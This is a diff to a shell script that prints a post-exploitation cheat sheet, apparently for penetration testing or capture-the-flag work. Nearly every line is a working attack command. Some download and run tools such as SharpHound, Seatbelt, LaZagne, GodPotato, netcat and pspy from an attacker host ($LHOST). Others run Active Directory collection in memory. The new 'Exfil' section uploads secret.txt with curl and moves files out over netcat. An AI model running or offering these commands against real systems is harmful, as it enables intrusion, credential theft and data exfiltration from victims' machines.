@@ -51,7 +51,17 @@ echo "$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://
 echo
 echo "# PrivescCheck"
 echo "iwr -uri http://$LHOST:$TOOLS_PORT/windows/PrivescCheck.ps1 -Outfile C:\Windows\Temp\PrivescCheck.ps1 | . .\PrivescCheck.ps1; Invoke-PrivescCheck"
-echo 
+echo
+echo "# Seatbelt - Seatbelt.exe -group=all"
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/Seatbelt.exe  C:\Windows\Temp\Seatbelt.exe"
+echo
+echo "# Sharphound"
+echo "IEX(IWR -usebasicparsing http://$LHOST:$TOOLS_PORT/windows/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All -OutputDirectory C:\Windows\Temp\ -OutputPrefix \"exfil_audit\""
+echo
+echo "iwr -uri http://$LHOST:$TOOLS_PORT/windows/LaZagne.exe -Outfile C:\Windows\Temp\LaZagne.exe"
+echo "iwr -uri http://$LHOST:$TOOLS_PORT/windows/Seatbelt.exe -Outfile C:\Windows\Temp\Seatbelt.exe"
+echo "iwr -uri http://$LHOST:$TOOLS_PORT/windows/SharpHound.ps1 -Outfile C:\Windows\Temp\SharpHound.ps1"
+echo
 echo "=== GodPotato ==="
 echo
 echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/nc64.exe C:\Windows\Temp\nc.exe"
@@ -86,3 +96,8 @@ echo "# Pspy"
 echo "wget -O /tmp/pspy64 http://$LHOST:$TOOLS_PORT/linux/pspy64 && chmod +x /tmp/pspy64"
 echo
 echo
+echo "# Exfil"
+echo
+echo "curl -F \"files=@secret.txt\" http://$LHOST:9999/upload"
+echo "Sender:   cat file | nc $LHOST 1234"
+echo "Receiver: nc -l -p 1234 -q 1 > file.ext < /dev/null"
